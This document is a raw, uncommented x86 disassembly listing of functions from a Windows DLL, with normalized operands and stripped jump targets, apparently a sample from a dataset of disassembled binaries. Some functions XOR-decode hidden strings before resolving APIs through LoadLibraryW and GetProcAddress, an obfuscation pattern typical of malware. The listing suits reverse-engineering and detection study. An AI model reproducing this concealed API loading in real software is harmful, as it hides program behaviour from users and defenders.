push 0x208
lea ecx [ ebp - 0x3a0 ]
push ebx
push ecx
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x3a0 ]
call sub_10048a90
test eax eax
je r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0x6
mov esi [ ebp - 0x4bc ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x6
push eax
lea ecx [ ebp - 0x4c0 ]
mov [ ebp - 0x4c0 ] ebx
mov [ ebp - 0x4bc ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x4c0 ] ebx
jne r-xdata
push 0x1
call sub_10055606
add esp 0x4
push eax
lea ecx [ ebp - 0x4c8 ]
mov [ ebp - 0x4c8 ] ebx
mov [ ebp - 0x4c4 ] ebx
call sub_100304d0
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x4c8 ] ebx
jne r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
lea eax [ ebp - 0x4c0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10044190
cmp [ ebp - 0x3a8 ] 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
lea eax [ ebp - 0x3a0 ]
push eax
lea esi [ ebp - 0x4c0 ]
call sub_10018d10
test eax eax
jne r-xdata
push edi
push ebx
call esi
jmp r-xdata
mov edx [ ebp - 0x3bc ]
push edx
call sub_1006591f
add esp 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
push edi
push ebx
call [ GetProcessHeap@IAT ]
mov esi [ ebp - 0x4c0 ]
mov eax esi
call sub_100339d0
test eax eax
jne r-xdata
push eax
call [ HeapFree@IAT ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi + 0x128 ]
mov [ ebp - 0x4d4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
lea esi [ ebp - 0x410 ]
call sub_10058280
add esp 0x4
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0x400 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + esi + 0x1 ]
lea eax [ esi + esi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov ecx esi
call sub_10041b00
add esp 0x8
push ebx
lea ecx [ ebp - 0x4b8 ]
call sub_10012920
mov [ ebp - 0x4cc ] eax
push edi
lea ecx [ ebp - 0x480 ]
mov [ ebp - 0x4 ] 0xb
call sub_10012920
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x49c ]
mov [ ebp - 0x4 ] 0xc
call sub_10016380
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x4cc ]
lea edi [ ebp - 0x464 ]
mov [ ebp - 0x4 ] 0xd
call sub_10044a40
push eax
lea edx [ ebp - 0x24 ]
lea esi [ ebp - 0x3d8 ]
mov [ ebp - 0x4 ] 0xe
call sub_10030dc0
add esp 0x4
mov ecx edi
call sub_10029c40
lea ecx [ ebp - 0x49c ]
call sub_10029c40
lea ecx [ ebp - 0x480 ]
call sub_10029c40
lea ecx [ ebp - 0x4b8 ]
mov [ ebp - 0x4 ] 0x13
call sub_10029c40
mov eax [ ebp - 0x4d0 ]
mov edi [ GetProcessHeap@IAT ]
push eax
push 0x0
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
push ebx
push 0x0
call edi
push eax
call esi
nop
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x410 ]
call sub_10029c40
jmp r-xdata
lea ecx [ ebp - 0x3d8 ]
call sub_10029c40
lea ecx [ ebp - 0x410 ]
call sub_10029c40
jmp r-xdata
mov eax [ ebp - 0x4e8 ]
mov ecx [ ebp - 0x4e4 ]
movzx edx [ ebp - 0x4dc ]
push eax
mov eax [ ebp - 0x4d0 ]
push ecx
mov ecx [ ebp - 0x4d8 ]
push edx
mov edx [ ebp - 0x4cc ]
push eax
push ecx
push edx
push ebx
lea eax [ ebp - 0x198 ]
push eax
mov ecx edi
mov ebx esi
call sub_10041b00
add esp 0x20
lea ecx [ ebp - 0x3d8 ]
push ecx
mov edx esi
call sub_10026630
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0x4d4 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4d4 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x4d4 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x1c ]
mov ebx [ eax + 0x4 ]
mov edi [ eax + 0xc ]
mov [ ebp - 0x4cc ] edx
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4d0 ] ecx
mov esi ebx
mov ecx rw-data
mov [ ebp - 0x4d8 ] edi
mov [ ebp - 0x4dc ] edx
mov [ ebp - 0x4e4 ] eax
call sub_1005ee60
mov edx [ ebp - 0x4d0 ]
mov esi [ lstrlenW@IAT ]
movzx ecx al
push edx
mov [ ebp - 0x4e8 ] ecx
call esi
push edi
mov edi eax
call esi
add edi eax
mov eax [ ebp - 0x4cc ]
push eax
call esi
push ebx
add edi eax
call esi
lea ecx [ ebp - 0x198 ]
push ecx
add edi eax
call esi
lea edi [ eax + edi + 0xa ]
lea edx [ edi + edi ]
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x3d8 ]
push eax
lea edx [ ebp - 0x3c ]
call sub_10026630
push 0xffffffff
push 0x0
push rw-data
lea ecx [ ebp - 0x3d8 ]
call sub_10043930
lea ecx [ ebp - 0x3d8 ]
push ecx
lea edx [ ebp - 0x70 ]
call sub_10026630
mov edx [ ebp - 0x3c8 ]
lea eax [ edx + edx + 0x2 ]
push eax
mov ebx 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x3d8 ]
cmp [ ebp - 0x3c4 ] ebx
jae r-xdata
lea ecx [ ebp - 0x3d8 ]
call sub_10029c40
lea ecx [ ebp - 0x410 ]
call sub_10029c40
mov [ ebp - 0x4 ] bl
jmp r-xdata
push eax
push esi
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x3d8 ]
call sub_10029c40
lea ecx [ ebp - 0x410 ]
call sub_10029c40
lea eax [ ebp - 0x4c8 ]
mov [ ebp - 0x4 ] bl
call sub_10044190
lea eax [ ebp - 0x4c0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10044190
lea ecx [ ebp - 0x3bc ]
call sub_10029c40
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x3d8 ]
lea eax [ ebp - 0x4c8 ]
call sub_10044190
lea eax [ ebp - 0x4c0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10044190
lea ecx [ ebp - 0x3bc ]
call sub_10029c40
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1006ad80
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0xc ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ecx ]
mov esi [ edx ]
cmp eax 0x4
jb r-xdata
test eax eax
je r-xdata
jmp r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
cmp eax 0x1
jbe r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_1006adf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082e01
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xec ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xe8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xe4 ] eax
movsx eax [ ecx ]
xor eax 0x3f
xor ecx ecx
and eax 0xff
mov [ ebp - 0xdc ] ax
mov [ ebp - 0xda ] cx
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x78
and esi 0xff
mov [ ebp + eax * 2 - 0x18 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_100531b0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0xdc ]
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] ebx
call sub_10016380
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x4
mov esi 0x8
cmp [ ebp - 0xc0 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
nop
mov edx [ ebp - 0x9c ]
push edx
call sub_1006591f
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0xec ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x1c ] ax
call sub_10059890
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0x5c
and ecx 0xff
mov [ ebp - 0xd8 ] cx
xor edx edx
mov [ ebp - 0xd6 ] dx
movsx ecx [ eax ]
xor ecx 0xffdf
and ecx 0xff
mov [ ebp - 0xe0 ] cx
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0xde ] dx
push ecx
lea edx [ ebp - 0xd8 ]
lea ecx [ ebp - 0xb8 ]
call sub_10059890
mov ecx [ ebp - 0xb8 ]
add esp 0x10
cmp [ ebp - 0xa4 ] esi
jae r-xdata
mov edx [ ebp - 0xe4 ]
call sub_10017560
cmp [ ebp - 0xa4 ] 0x8
mov esi eax
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xb8 ]
push edx
call sub_1006591f
add esp 0x4
sub_1006b090
push ebp
mov ebp esp
push 0xffffffff
push sub_1008217c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
call sub_10054730
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
xor ebx ebx
mov ecx [ edi ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
cmp [ esi + 0x44 ] 0x8
jb r-xdata
push eax
call sub_1006591f
add esp 0x4
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
xor edx edx
mov [ esi + 0x44 ] 0x7
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] dx
mov edi [ esi + 0x18 ]
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebx [ esi + 0x1c ]
cmp edi ebx
je r-xdata
lea eax [ esi + 0x4c ]
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ esi + 0x64 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_1006591f
add esp 0x4
mov edx [ esi + 0x18 ]
push edx
call sub_1006591f
add esp 0x4
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_1006591f
add esp 0x4
sub_1006b1c0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0x38 ]
push ebx
mov ebx [ ebp - 0x34 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10057560
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x2c0 ] ebx
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] ebx
mov [ esi + 0x2c4 ] cx
mov [ esi + 0x2e4 ] bl
mov ecx [ r--data ]
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x37
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x1c ] ax
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x34 ] eax
mov [ esi + 0x2c0 ] eax
cmp eax ebx
je r-xdata
mov eax esi
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov al [ ecx + edi ]
xor al dl
xor al 0xce
inc dl
mov [ ebp + ecx - 0x18 ] al
movzx ecx dl
cmp ecx 0x12
jb r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x6 ] bl
call [ GetProcAddress@IAT ]
mov [ esi + 0x2e0 ] eax
cmp eax ebx
mov eax esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
pop edi
mov [ esi + 0x2e4 ] 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
sub_1006b2d6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_100660be
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_1006b399
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003be34
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1006b3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f0db
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1006b489
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_1006b4d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1000bd19
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_1006b52f
push 0x20
mov eax sub_1007fc44
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004e2c1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10019180
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10020b50
mov eax edi
call sub_1004fa89
retn 0x24
sub_1006b5be
push 0x4
mov eax sub_1007f289
call sub_100097c8
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_1004db01
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_100014b7
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10050f50
push 0x20
call sub_10055606
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_10003d04
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10055040
mov ecx esi
mov [ rw-data ] esi
call sub_10030d90
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_10037919
mov esi eax
sub_1006b64d
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10024583
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10003fff
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1002ec01
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_10031928
pop ecx
test eax eax
jne r-xdata
call sub_10003fff
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1002ec01
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000ab75
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_100338d2
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1006b7c0
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
push edi
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xfc ] eax
mov [ ebp - 0xd8 ] 0x0
test esi esi
jne r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xe4 ] ecx
test ecx ecx
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xa3
call sub_10013830
lea eax [ esi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax ]
lea ecx [ eax + 0x128 ]
add eax 0x12c
mov [ ebp - 0xe8 ] eax
lea edx [ ebp - 0x10 ]
mov eax 0x92
mov [ ebp - 0xe0 ] ecx
call sub_10013830
lea edx [ ebp - 0x1c ]
mov eax 0x126
call sub_10013830
lea edx [ ebp - 0x40 ]
mov eax 0x71
call sub_10013830
lea edx [ ebp - 0x50 ]
mov eax 0xe6
call sub_10013830
lea edx [ ebp - 0x60 ]
mov eax 0xdf
call sub_10013830
lea edx [ ebp - 0x74 ]
mov eax 0xac
call sub_10013830
mov edi [ lstrcmpW@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xb4 ]
lea eax [ ecx + 0x2b ]
call sub_10013830
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xe4 ]
dec eax
je r-xdata
lea edx [ ebp - 0x40 ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x132
jmp r-xdata
lea esi [ ebp - 0xf0 ]
mov ecx ebx
call sub_10068700
mov ecx [ ebp - 0xe8 ]
mov esi [ ecx ]
mov eax [ eax ]
mov [ ebp - 0xe4 ] eax
test esi esi
je r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0x50 ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xe4 ]
sub eax 0x0
je r-xdata
call sub_10013830
xor esi esi
mov edx [ ebp - 0xe4 ]
mov eax [ esi ]
mov ecx [ edx ]
mov eax [ eax ]
push ecx
push eax
call edi
test eax eax
je r-xdata
lea esi [ ebp - 0x10c ]
mov ecx ebx
call sub_1003adb0
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10020080
lea edi [ ebp - 0x10c ]
mov esi eax
call sub_1005bb10
test esi esi
jne r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xc2
jmp r-xdata
lea edx [ ebp - 0x60 ]
push edx
push esi
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe4 ]
sub eax 0x0
je r-xdata
mov ecx [ ebp - 0xd8 ]
lea edx [ ebp - 0x30 ]
mov eax 0x7a
mov [ ebx + 0x8 ] ecx
call sub_10013830
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x30 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov [ ebx + 0xc ] eax
call sub_100796a0
mov edx [ ebp - 0xfc ]
mov edi [ edx ]
add esp 0xc
push ebx
add edi 0x138
call sub_1004bbc0
mov ecx [ ebp - 0x8 ]
